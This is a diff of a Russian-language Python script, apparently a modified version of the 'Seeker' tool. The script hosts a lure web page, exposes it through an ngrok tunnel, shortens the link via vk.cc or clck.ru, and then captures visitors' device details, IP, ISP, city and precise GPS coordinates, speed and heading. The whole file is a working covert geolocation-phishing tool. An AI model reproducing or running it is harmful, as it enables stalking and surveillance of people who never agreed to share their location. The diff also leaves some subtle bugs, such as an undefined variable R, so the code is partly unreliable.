@@ -1,68 +1,43 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import os
 import csv
 import sys
 import time
 import json
-import argparse
 import requests
 import subprocess as subp
 import vk_api
+from config import ngrok_token, vk_login, vk_password
 from pyngrok import ngrok
-
-R = '\033[31m' # red
-G = '\033[32m' # green
-C = '\033[36m' # cyan
-W = '\033[0m'  # white
-
-parser = argparse.ArgumentParser()
-parser.add_argument('-k', '--kml', help='Имя файла KML (Необязательно)')
-parser.add_argument('-vkl', '--vklogin', help='Ваш логин ВК (Необязательно)')
-parser.add_argument('-vkp', '--vkpassword', help='Ваш пароль ВК (Необязательно)')
-parser.add_argument('-ngrok', '--ngroktoken', help='Ваш токен от аккаунта ngrok')
-args = parser.parse_args()
-kml_fname = args.kml
-vk_login = args.vklogin
-vk_password = args.vkpassword
-ngrok_token = args.ngroktoken
 
 row = []
 site = ''
 info = ''
 result = ''
-version = '1.2.1.2'
-vk_output = ''
-
-if args.vklogin != None and args.vkpassword != None:
-	vk = vk_api.VkApi(vk_login, vk_password)
-	vk.auth()
-	api = vk.get_api()
+version = '1.2.1.3'
+OSList = 0
+shortener = 0
+api = ''
+shortener_output = ''
 
 def banner():
+	global ngrok_token
 	os.system('clear')
-	print (G +
+	print (
 	r'''
                         __
   ______  ____   ____  |  | __  ____ _______
  /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
  \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
 /____  > \___  >\___  >|__|_ \ \___  >|__|
-	 \/      \/     \/      \/     \/        ''' + W)
-	print('\n' + G + '[>]' + C + ' Создатель: ' + W + 'thewhiteh4t')
-	print(G + '[>]' + C + ' Перевод и модификация: ' + W + 'Phelifar' + '\n')
-	print(G + '[>]' + C + ' Версия: ' + W + version + '\n')
-
-def check_args():
-	if args.ngroktoken == None:
-		print(R + '[Ошибка] Токен от ngrok отсутсвует!')
-		Quit()
-	else:
-		ngrok.set_auth_token(ngrok_token)
+	 \/      \/     \/      \/     \/        ''' +'\n' )
+	print('[>] Создатель: thewhiteh4t')
+	print('[>] Перевод и модификация: Phelifar\n')
+	print('[>] Версия: ' + version + '\n')
+	if ngrok_token == None:
+		print('[-] Вы не ввели токен ngrok \n')
 
 def ver_check():
-	print(G + '[+]' + C + ' Проверка обновлений.....', end='')
+	print('[+] Проверка обновлений.....', end='')
 	ver_url = 'https://raw.githubusercontent.com/Phelifaar/seeker/master/version.txt'
 	ver_rqst = requests.get(ver_url)
 	ver_sc = ver_rqst.status_code
@@ -71,58 +46,68 @@ def ver_check():
 		github_ver = github_ver.strip()
 
 		if version == github_ver:
-			print(C + '[' + G + ' Новейший ' + C +']' + '\n')
+			print('[Новейший]\n')
 		else:
-			print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
+			print('[Последняя версия: {}'.format(github_ver) + ']\n')
 	else:
-		print(C + '[' + R + ' Статус : {} '.format(ver_sc) + C + ']' + '\n')
+		print('[Статус: {}'.format(ver_sc) + ']\n')
 
+def os_select():
+	global OSList
+	print('[+] Выберите ОС:')
+	print('[1] Linux, Termux')
+	print('[2] Windows 10')
+	OSList = int(input('[>] '))
+
+def shortener_select():
+	global shortener
+	print('\n[+] Выберите сократитель:')
+	print('[1] vk.cc')
+	print('[2] clck.ru')
+	shortener = int(input('[>] '))
 
 def template_select():
 	global site, info, result
-	print(G + '[+]' + C + ' Выберите вид Seeker : ' + W + '\n')
-	print(G + '[1]' + C + ' NearYou' + W)
-	print(G + '[2]' + C + ' Google Drive' + W)
-	selected = int(input(G + '[>] ' + W))
-	
+	print('\n[+] Выберите вид Seeker:')
+	print('[1] NearYou')
+	selected = int(input('[>] '))
+
 	if selected == 1:
 		site = 'nearyou'
-		print('\n' + G + '[+]' + C + ' Загрузка NearYou...' + W)
-	elif selected == 2:
-		site = 'gdrive'
-		print('\n' + G + '[+]' + C + ' Загрузка Google Drive...' + W)
-		redirect = input(G + '[+]' + C + ' Впишите URL файла на GDrive  : ' + W)
-		with open('template/gdrive/js/location_temp.js', 'r') as js:
-			reader = js.read()
-			update = reader.replace('REDIRECT_URL', redirect)
-		with open('template/gdrive/js/location.js', 'w') as js_update:
-			js_update.write(update)
+		print('\n' + '[+] Загрузка NearYou...')
 	else:
-		print(R + '[-]' + C + ' Неверный ввод, принимаются только цифры' + W + '\n')
+		print('[-] Неверный ввод, принимаются только цифры\n')
 
 	info = 'template/{}/php/info.txt'.format(site)
 	result = 'template/{}/php/result.txt'.format(site)
 
 def server():
 	global site
-	print('\n' + G + '[+]' + C + ' Запуск PHP Сервера......' + W, end='')
-	with open('logs/php.log', 'w') as phplog:
-		subp.Popen(['php', '-S', '0.0.0.0:8080', '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
-		time.sleep(3)
+	print('\n' + '[+] Запуск PHP Сервера......', end='')
+	subp.Popen(['php', '-S', '0.0.0.0:8080', '-t', 'template/{}/'.format(site)])
+	time.sleep(3)
 	try:
-		php_rqst = requests.get('http://0.0.0.0:8080/index.html')
-		php_sc = php_rqst.status_code
+		php_sc = requests.get('http://0.0.0.0:8080/index.html').status_code
 		if php_sc == 200:
-			print(C + '[' + G + ' Успех ' + C + ']' + W)
+			print('[Успех]')
 		else:
-			print(C + '[' + R + 'Статус : {}'.format(php_sc) + C + ']' + W)
+			print('[Статус: {}'.format(php_sc) + ']')
 	except requests.ConnectionError:
-		print(C + '[' + R + ' Неудача ' + C + ']' + W)
+		print('[Неудача]')
 		Quit()
 	public_url = ngrok.connect(8080, proto='http')
-	print('\n' + G + '[>]' + C + ' Полная ссылка: ' + W + public_url)
-	vk_output = api.utils.getShortLink(url=public_url, private=1)
-	print(G + '[>]' + C + ' Сокращённая ссылка: ' + W + vk_output['short_url'] + '\n')
+	print('\n' + '[>] Полная ссылка: ' + public_url)
+	if shortener == 1:
+		if vk_login != None and vk_password != None:
+			vk = vk_api.VkApi(vk_login, vk_password)
+			vk.auth()
+			shortener_output = vk.get_api().utils.getShortLink(url=public_url, private=1)
+			print('[>] Сокращённая ссылка: ' + shortener_output['short_url'] + '\n')
+		else:
+			print(R + '[-] Логин и пароль от ВК не введены\n')
+			Quit()
+	elif shortener == 2:
+		print('[>] Сокращённая ссылка: ' + requests.get('https://clck.ru/--?url=' + public_url).text + '\n')
 
 def wait():
 	printed = False
@@ -130,7 +115,7 @@ def wait():
 		time.sleep(2)
 		size = os.path.getsize(result)
 		if size == 0 and printed == False:
-			print('\n' + G + '[+]' + C + ' Ожидаются действия пользователя...' + W + '\n')
+			print('\n[+] Ожидаются действия пользователя...\n')
 			printed = True
 		if size > 0:
 			main()
@@ -157,23 +142,23 @@ def main():
 				var_ip = value['ip']
 
 				row.append(var_os)
-				row.append(var_platform) 
-				row.append(var_cores) 
-				row.append(var_ram) 
+				row.append(var_platform)
+				row.append(var_cores)
+				row.append(var_ram)
 				row.append(var_render)
 				row.append(var_res)
 				row.append(var_browser)
 				row.append(var_ip)
 
-				print(G + '[+]' + C + ' Информация устройства : ' + W + '\n')
-				print(G + '[+]' + C + ' ОС         : ' + W + var_os)
-				print(G + '[+]' + C + ' Платформа  : ' + W + var_platform)
-				print(G + '[+]' + C + ' Кол-го ядер: ' + W + var_cores)
-				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
-				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
-				print(G + '[+]' + C + ' Разрешение : ' + W + var_res)
-				print(G + '[+]' + C + ' Браузер    : ' + W + var_browser)
-				print(G + '[+]' + C + ' IP         : ' + W + var_ip)
+				print('[+] Информация устройства:\n')
+				print('[+] ОС         : ' + var_os)
+				print('[+] Платформа  : ' + var_platform)
+				print('[+] Кол-го ядер: ' + var_cores)
+				print('[+] RAM        : ' + var_ram)
+				print('[+] GPU        : ' + var_render)
+				print('[+] Разрешение : ' + var_res)
+				print('[+] Браузер    : ' + var_browser)
+				print('[+] IP         : ' + var_ip)
 
 				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
 				sc = rqst.status_code
@@ -191,13 +176,13 @@ def main():
 					row.append(var_city)
 					row.append(var_isp)
 
-					print(G + '[+]' + C + ' Страна     : ' + W + var_country)
-					print(G + '[+]' + C + ' Регион     : ' + W + var_region)
-					print(G + '[+]' + C + ' Город      : ' + W + var_city)
-					print(G + '[+]' + C + ' Провайдер  : ' + W + var_isp)
+					print('[+] Страна     : ' + var_country)
+					print('[+] Регион     : ' + var_region)
+					print('[+] Город      : ' + var_city)
+					print('[+] Провайдер  : ' + var_isp)
 	except ValueError:
 		pass
-	
+
 	try:
 		with open (result, 'r') as file:
 			file = file.read()
@@ -212,13 +197,13 @@ def main():
 					var_alt = 'Нет данных'
 				else:
 					var_alt == value['alt'] + ' m'
-				
+
 				var_dir = value['dir']
 				if var_dir == '':
 					var_dir = 'Нет данных'
 				else:
 					var_dir = value['dir'] + ' deg'
-				
+
 				var_spd = value['spd']
 				if var_spd == '':
 					var_spd = 'Нет данных'
@@ -232,44 +217,21 @@ def main():
 				row.append(var_dir)
 				row.append(var_spd)
 
-				print ('\n' + G + '[+]' + C + ' Информация местоположения: ' + W + '\n')
-				print (G + '[+]' + C + ' Широта      : ' + W + var_lat)
-				print (G + '[+]' + C + ' Долгота     : ' + W + var_lon)
-				print (G + '[+]' + C + ' Точность    : ' + W + var_acc)
-				print (G + '[+]' + C + ' Высота      : ' + W + var_alt)
-				print (G + '[+]' + C + ' Направление : ' + W + var_dir)
-				print (G + '[+]' + C + ' Скорость    : ' + W + var_spd)
+				print ('\n[+] Информация местоположения:\n')
+				print ('[+] Широта      : ' + var_lat)
+				print ('[+] Долгота     : ' + var_lon)
+				print ('[+] Точность    : ' + var_acc)
+				print ('[+] Высота      : ' + var_alt)
+				print ('[+] Направление : ' + var_dir)
+				print ('[+] Скорость    : ' + var_spd)
 	except ValueError:
 		error = file
-		print ('\n' + R + '[-] ' + W + error)
+		print ('\n' + '[-] Данные не получены')
 		repeat()
 
-	print ('\n' + G + '[+]' + C + ' Google Maps.................: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
-	
-	if kml_fname is not None:
-		kmlout(var_lat, var_lon)
+	print ('\n[+] Google Maps.................: https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
 
-	csvout()
 	repeat()
-
-def kmlout(var_lat, var_lon):
-	with open('template/sample.kml', 'r') as kml_sample:
-		kml_sample_data = kml_sample.read()
-
-	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
-	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))
-
-	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
-		kml_gen.write(kml_sample_data)
-
-	print(G + '[+]' + C + ' Генерация KML файла..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))
-
-def csvout():
-	global row
-	with open('db/results.csv', 'a') as csvfile:
-		writer = csv.writer(csvfile)
-		writer.writerow(row)
-	print(G + '[+]' + C + ' Добавлена новая запись в базу данных: ' + W + os.getcwd() + '/db/results.csv')
 
 def clear():
 	global result
@@ -284,13 +246,17 @@ def repeat():
 def Quit():
 	global result
 	with open (result, 'w+'): pass
-	os.system('pkill php')
+	if(OSList == 1):
+		os.system('pkill php')
+	elif(OSList == 2):
+		os.system("taskkill /IM php.exe /f")
 	exit()
 
 try:
 	banner()
 	ver_check()
-	check_args()
+	os_select()
+	shortener_select()
 	template_select()
 	server()
 	wait()
